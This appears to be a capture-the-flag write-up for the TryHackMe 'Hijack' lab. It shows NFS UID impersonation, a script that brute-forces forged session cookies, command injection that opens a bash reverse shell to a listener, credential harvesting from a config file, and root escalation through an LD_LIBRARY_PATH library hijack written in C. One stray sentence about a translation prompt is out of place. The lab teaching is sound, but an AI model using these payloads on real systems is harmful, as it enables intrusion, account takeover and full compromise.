# Hijack
https://tryhackme.com/room/hijack

# Initial Enumeration

scanning the runnng service to know more about it 
```
nmap -sV -sC 10.49.153.158
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-25 21:10 IST
Nmap scan report for 10.49.153.158
Host is up (0.053s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
|_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      43133/udp6  mountd
|   100005  1,2,3      46890/tcp6  mountd
|   100005  1,2,3      54493/udp   mountd
|   100005  1,2,3      59154/tcp   mountd
|   100021  1,3,4      35344/tcp6  nlockmgr
|   100021  1,3,4      40813/tcp   nlockmgr
|   100021  1,3,4      40830/udp   nlockmgr
|   100021  1,3,4      58349/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp open  nfs     2-4 (RPC #100003)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
there are some port thta re open
* 21 ftp
* ssh on port 22
* port 80 http
* 111
* nfs 2049

There are three services are really interesting for the initial lookup. I first checked the ftp and I thought maybe it allows the anonymous login but it failed. Then look into the nfs. Use showmount -e to show any exist directory names.
```
death@esther:~$ showmount -e 10.49.153.158
Export list for 10.49.153.158:
/mnt/share *
death@esther:~$
```
/mnt/share can be mounted onto the local machine


```
death@esther:/opt/thm$ mkdir hijack_ctf
death@esther:/opt/thm$ sudo mount -t nfs 10.49.153.158:/mnt/share/ hijack_ctf
[sudo] password for death: 
death@esther:/opt/thm$ ls -la
total 12
drwxr-xr-x 3 death death 4096 May 25 21:28 .
drwxr-xr-x 6 root  root  4096 May 25 21:28 ..
drwx------ 2  1003  1003 4096 Aug  9  2023 hijack_ctf
```
NFS lacks authentication and authorization. By creating a local user with UID/GID 1003, we effectively impersonated the NFS share’s owner and gained their permissions.


We created a user with the UID 1003 and GID 1003 on our local system to mimic the share’s owner.
```
sudo useradd hijack
sudo usermod -u 1003 hijack
sudo groupmod -g 1003 hijack
sudo passwd hijack
```
Having logged in as the new user, we will try accessing the mounted share.
```
su hijack
```
Within the mounted share, we found a text file that contained credentials for an FTP server.
```
death@esther:/opt/thm$ su hijack 
Password: 
$ ls
hijack_ctf
$ cd hijack_ctf
$ ls
for_employees.txt
$ cat for_employees.txt
ftp creds :

ftpuser:W3stV1rg1n14M0un741nM4m4
```
Let login to ftp
```
death@esther:~$ ftp 10.49.153.158
Connected to 10.49.153.158.
220 (vsFTPd 3.0.3)
Name (10.49.153.158:death): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
Listing directory got a hidden file
```
ftp> ls
229 Entering Extended Passive Mode (|||30802|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||35347|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 .
drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 ..
-rwxr-xr-x    1 1002     1002          220 Aug 08  2023 .bash_logout
-rwxr-xr-x    1 1002     1002         3771 Aug 08  2023 .bashrc
-rw-r--r--    1 1002     1002          368 Aug 08  2023 .from_admin.txt
-rw-r--r--    1 1002     1002         3150 Aug 08  2023 .passwords_list.txt
-rwxr-xr-x    1 1002     1002          655 Aug 08  2023 .profile
226 Directory send OK.
ftp> get .passwords_list.txt
local: .passwords_list.txt remote: .passwords_list.txt
229 Entering Extended Passive Mode (|||39466|)
150 Opening BINARY mode data connection for .passwords_list.txt (3150 bytes).
100% |***********************************|  3150       30.21 KiB/s    00:00 ETA
226 Transfer complete.
3150 bytes received in 00:00 (24.16 KiB/s)
ftp> exit
221 Goodbye.
death@esther:~$ 
```

maybe ther are passwords 
<img width="401" height="199" alt="image" src="https://github.com/user-attachments/assets/fee27f94-abb8-49a9-996d-1285742e9a0c" />


Let move to web

<img width="717" height="201" alt="image" src="https://github.com/user-attachments/assets/eaa5bc0c-8b49-450d-ad2e-f6edc2b1f111" />

Let sign up and login 
<img width="393" height="171" alt="image" src="https://github.com/user-attachments/assets/8028bf1d-957c-4b70-af1f-f0125ef2dc18" />

after login we can see the same but there is an admin tab here 
as i click on it its says 

<img width="696" height="121" alt="image" src="https://github.com/user-attachments/assets/f0fab9a3-b7ed-4899-ad03-e0dacb1e245a" />
crazy let get the req if we can switch directly from normal user to admin i open my burp and capture the request

<img width="828" height="801" alt="image" src="https://github.com/user-attachments/assets/0e169787-61a0-464e-8810-31801ddc4018" />

as i capture the reuqest i suspected the cookei pattern
```
Cookie: PHPSESSID=VGVzdDowZTc1MTcxNDFmYjUzZjIxZWU0MzliMzU1YjVhMWQwYQ%3D%3D
```
as i use cyberchef to identify it 

<img width="1127" height="610" alt="image" src="https://github.com/user-attachments/assets/eb8a823f-e53b-431e-b7e9-2697aab659f5" />

its look a like the username:hash_of_password
let see which hash is this one

<img width="880" height="490" alt="image" src="https://github.com/user-attachments/assets/f02e6d47-7f34-43db-a6e7-5fa9f22370d1" />

ok so this one is md5 
So the PHPSESSIDD is base64encoded(username:md5hash(password))
Given the fact that the admin uses a password from the given wordlist a session ID can be constructed and this session ID can be used to session hijack the admin’s account


i try to brutefroce it but there is rate limit 

<img width="1010" height="264" alt="image" src="https://github.com/user-attachments/assets/00e97215-77ad-4b06-9779-8728cd099970" />

i used chatgpt to crate a script of my desiger 
```
import hashlib
import base64
import requests
import os

target_ip = input("[+] Enter Target IP: ").strip()
wordlist = input("[+] Enter Wordlist Path: ").strip()

url = f"http://{target_ip}/administration.php"

if not os.path.exists(wordlist):
    print("[-] Wordlist not found")
    exit()

with open(wordlist, "r") as f:
    passwords = [line.strip() for line in f]

session = requests.Session()

print(f"\n[+] Loaded {len(passwords)} passwords")
print(f"[+] Target: {url}\n")

for password in passwords:

    md5_hash = hashlib.md5(password.encode()).hexdigest()

    session_data = f"admin:{md5_hash}"

    encoded_cookie = base64.b64encode(session_data.encode()).decode()

    headers = {
        "Cookie": f"PHPSESSID={encoded_cookie}"
    }

    try:
        response = session.get(url, headers=headers, timeout=5)

        print(f"[*] Trying: {password}")

        if "Access denied" not in response.text:

            print("\n[+] Valid Session Found")
            print(f"[+] Password : {password}")
            print(f"[+] Cookie   : PHPSESSID={encoded_cookie}")

            break

    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")
```
save the script 
```
nano bruteforce.py
```
how to use it 
```
death@esther:~$ nano bruteforce.py
death@esther:~$ python3 bruteforce.py 
[+] Enter Target IP: 10.49.153.158
[+] Enter Wordlist Path: .passwords_list.txt

[+] Loaded 150 passwords
[+] Target: http://10.49.153.158/administration.php
```
it ask for ip of website gave set
and it ask for wordlist path in my case i save script in home directory and my passwd list s there so i just gave it 
its tart brute force as u enter details

boom we got detais
```
[+] Valid Session Found
[+] Password : uDh3jCQsdcuLhjVkAy5x
[+] Cookie   : PHPSESSID=YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU=
death@esther:~$ 
```
<img width="784" height="179" alt="image" src="https://github.com/user-attachments/assets/10aa672c-458d-4b26-bd5e-b608b02bb804" />

let use this cookei to access admin pannel
let click on administration tab and captrue request
<img width="754" height="784" alt="image" src="https://github.com/user-attachments/assets/9ca1eb76-451c-4ad1-8597-3635fd333d49" />

Let replace this old cookei with our new 

<img width="1429" height="451" alt="image" src="https://github.com/user-attachments/assets/da352ba1-08ec-4e1a-9f0f-d3a0e79df363" />

as i replace it got admin pannel 

It is a online service checker, if you enter any services, it will show the status of the service.

as i check for service ssh it show me status 

<img width="1191" height="498" alt="image" src="https://github.com/user-attachments/assets/0fae9e75-f86e-44fb-aae8-1aea510089d1" />

make sure during sending req each time repaly ur cookei with admin cookei 

after understand the way of working i got know to buypass this with `&&` operator

let try to share a rev shell

```
ssh && bash -c "bash -i >& /dev/tcp/<IP>/1234 0>&1"
```
open netcat in your terminal first 
```
nc -lnvp 1234
```
add ur vpn ip to pyload 
Let upload it 

<img width="1275" height="510" alt="image" src="https://github.com/user-attachments/assets/ce00c706-8a2c-4d56-b0fe-06ebc58913a2" />

Wow we got the rev shell
```
death@esther:~$ nc -lnvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.49.153.158 47886
bash: cannot set terminal process group (1244): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Hijack:/var/www/html$ 
```
we got config file here 
```
www-data@Hijack:/var/www/html$ ls
ls
administration.php
config.php
index.php
login.php
logout.php
navbar.php
service_status.sh
signup.php
style.css
www-data@Hijack:/var/www/html$
```
let take a look and find creds

<img width="733" height="372" alt="image" src="https://github.com/user-attachments/assets/3a148004-9146-44cc-a543-58ee05b61367" />
```
$servername = "localhost";
$username = "rick";
$password = "N3v3rG0nn4G1v3Y0uUp";
$dbname = "hijack";
```
we got user:pass and db name
let try to elevate our privilage using ssh
```
ssh rick@10.49.153.158
password: N3v3rG0nn4G1v3Y0uUp
```
we r inside 
```
$ ls
user.txt
```

capturing User flag
```
$ cat user.txt
THM{fdc8cd4cff2c19e0d1022e78481ddf36}
```

## Priv esc 
as i check for 
```
$ sudo -l
[sudo] password for rick: 
Matching Defaults entries for rick on Hijack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_LIBRARY_PATH

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
$ 
```

From this sudo permission, we can see the sudo have a special environment variable called env_keep and its value is equals to LD_LIBRARY_PATH. Here is method for you to use it for privilege escalation.
The prompt is asking for a more precise English translation of a statement about the LD_LIBRARY_PATH environment variable and its relation to finding shared libraries for Apache.
```
ldd /usr/sbin/apache2
```

```
$ ldd /usr/sbin/apache2
	linux-vdso.so.1 =>  (0x00007fff5ab16000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f8885012000)
	libaprutil-1.so.0 => /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0 (0x00007f8884deb000)
	libapr-1.so.0 => /usr/lib/x86_64-linux-gnu/libapr-1.so.0 (0x00007f8884bb9000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f888499c000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f88845d2000)
	libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007f888439a000)
	libexpat.so.1 => /lib/x86_64-linux-gnu/libexpat.so.1 (0x00007f8884171000)
	libuuid.so.1 => /lib/x86_64-linux-gnu/libuuid.so.1 (0x00007f8883f6c000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f8883d68000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f8885527000)
$ 
```
We’ll create a malicious C program (malware.c) in /tmp to exploit the libcrypt.so.1 library

The LD_LIBRARY_PATH contains a list of directories which search for shared libraries first
Using ldd /usr/sbin/apache2. To print the shared libraries of the apache2 program,
Use one of the shared objects in the list and we will hijack it by creating a file with the same name. For this demonstration, we will target the libcrypt.so.1 file
Creating a shared library-
```
nano library_path.c
```
past this 
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
static void hijack() __attribute__((constructor));
void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setreuid(0,0);
        system("/bin/bash -p");
}
```
Compiling the C binary-
```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/rick/library_path.c
```
Executing the exploit to gain root access-
```
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

<img width="1303" height="164" alt="image" src="https://github.com/user-attachments/assets/efb9896e-09d1-4750-98e2-5e58616472ce" />

Capturing the root flag
```
root@Hijack:~# cat /root/root.txt 

██╗░░██╗██╗░░░░░██╗░█████╗░░█████╗░██╗░░██╗
██║░░██║██║░░░░░██║██╔══██╗██╔══██╗██║░██╔╝
███████║██║░░░░░██║███████║██║░░╚═╝█████═╝░
██╔══██║██║██╗░░██║██╔══██║██║░░██╗██╔═██╗░
██║░░██║██║╚█████╔╝██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

THM{b91ea3e8285157eaf173d88d0a73ed5a}
root@Hijack:~# 

```

<img width="829" height="385" alt="image" src="https://github.com/user-attachments/assets/b3fb5c0e-6f42-43f6-ba47-8aa01b3cdad4" />
